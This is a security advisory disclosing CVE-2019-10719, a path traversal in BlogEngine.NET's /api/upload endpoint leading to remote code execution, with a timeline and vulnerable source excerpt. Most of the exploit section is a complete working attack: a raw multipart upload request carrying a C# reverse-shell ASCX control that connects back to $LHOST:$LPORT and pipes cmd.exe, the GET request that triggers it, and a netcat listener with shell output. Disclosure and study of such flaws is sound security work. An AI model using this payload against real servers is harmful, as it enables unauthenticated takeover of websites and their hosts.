A remote code execution (RCE) vulnerability, **CVE-2019-10719**, was discovered in BlogEngine 3.3.7 and earlier.  Leveraging a path traversal in `/api/upload`, a malicious file could be written to a directory which would allow it to be accessed and executed.  **Edit post** permissions are required to upload the shell.  Anyone can trigger the shell without authentication.

### Vendor Patch

* <https://github.com/rxtur/BlogEngine.NET/releases>

### Timeline

* 30 Mar 2019 - Issue Identified
* 31 Mar 2019 - Developer contacted
* 04 Apr 2019 - Details of vulnerability sent
* 17 Jun 2019 - Public Disclosure

### Description

BlogEngine.NET allows users to upload files through the `/api/upload` endpoint.  Files uploaded using **file**, **filemgr**, or **image** as the `action` ultimately call `BlogService.UploadFile` and create the file:

~~~{command="BlogEngine/BlogEngine.NET/AppCode/Api/UploadController.cs"}
if (action == "filemgr" || action == "file")
{
    string[] ImageExtensnios = { ".jpg", ".png", ".jpeg", ".tiff", ".gif", ".bmp" };

    if (ImageExtensnios.Any(x => fileName.ToLower().Contains(x.ToLower())))
        action = "image";
    else
        action = "file";
}
<r:snip></r:snip>
if (action == "image")
{
    if (Security.IsAuthorizedTo(Rights.EditOwnPosts))
    {
        dir = BlogService.GetDirectory(dirName);
        var uploaded = <r:b>BlogService.UploadFile(file.InputStream, fileName, dir, true);</r:b>
        return Request.CreateResponse(HttpStatusCode.Created, uploaded.AsImage.ImageUrl);
    }
}
if (action == "file")
{
    if (Security.IsAuthorizedTo(Rights.EditOwnPosts))
    {
        dir = BlogService.GetDirectory(dirName);
        var uploaded = <r:b>BlogService.UploadFile(file.InputStream, fileName, dir, true);</r:b>
        retUrl = uploaded.FileDownloadPath + "|" + fileName + " (" + BytesToString(uploaded.FileSize) + ")";
        return Request.CreateResponse(HttpStatusCode.Created, retUrl);
    }
}
~~~

The **dirPath** parameter is used to specify a folder the file will be written to.  **dirPath** is vulnerable to directory traversal, allowing files to be written to any directory.  

A malicious `PostView.ascx` can be written to a sub-directory of **/Custom/Themes**, bypassing the fix for **CVE-2019-6714**.  If the folder does not exist, it will be created and contain the malicious `PostView.ascx`.

<pagebreak></pagebreak>

### Exploit

<https://github.com/irbishop/CVEs/blob/master/2019-10719/exploit.py>

The following will upload the file to **/Custom/Themes/RCE_Test**. **RCE_Test** will be created if it does not exist:

~~~
POST /api/upload?action=filemgr&dirPath=%2f..%2f..%2fCustom%2fThemes%2fRCE_Test HTTP/1.1
Host: <r:var>$RHOST</r:var>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/plain
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: .AUXBLOGENGINE-96d5b379-7e1d-4dac-a6ba-1e50db561b04=<r:redacted>Test</r:redacted>
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------12143974373743678091868871063
Content-Length: 2085

-----------------------------12143974373743678091868871063
Content-Disposition: form-data; filename="PostView.ascx"

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;
    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);
	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("<r:var>$LHOST</r:var>", <r:var>$LPORT</r:var>)) {
		using(System.IO.Stream stream = client.GetStream()) {
			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
				streamWriter = new System.IO.StreamWriter(stream);
				StringBuilder strInput = new StringBuilder();
				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();

				while(true) {
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
    } } } } }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
	   	StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                   	streamWriter.WriteLine(strOutput);
                   	streamWriter.Flush();
			} catch (Exception err) { }
        }
    }
</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>

-----------------------------12143974373743678091868871063--
~~~

<pagebreak></pagebreak>

Open a `netcat` listener, `nc -nlvp $LPORT`, and browse to the application root with the **theme** set to RCE_Test.

~~~
GET /?theme=RCE_Test HTTP/1.1
Host: <r:var>$RHOST</r:var>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
~~~

~~~{command="nc -nlvp $LPORT"}
listening on [any] <r:var>$LPORT</r:var> ...
connect to [<r:var>$LHOST</r:var>] from (UNKNOWN) [<r:var>$RHOST</r:var>] 49958
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
~~~